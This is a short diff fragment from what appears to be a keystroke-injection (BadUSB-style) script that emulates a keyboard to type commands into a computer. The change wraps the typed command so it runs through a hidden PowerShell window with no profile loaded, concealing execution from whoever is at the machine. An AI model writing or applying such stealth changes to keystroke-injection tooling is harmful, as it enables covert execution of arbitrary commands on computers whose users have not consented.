@@ -20,7 +20,7 @@ def run_powershell_hidden(command):
     kbd.press(Keycode.ENTER)
     kbd.release_all()
     time.sleep(3)
-    layout.write(command, delay=0.005)
+    layout.write(f"Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoP -C {command}\"", delay=0.005)
     kbd.press(Keycode.ENTER)
     kbd.release_all()
     time.sleep(0.2)
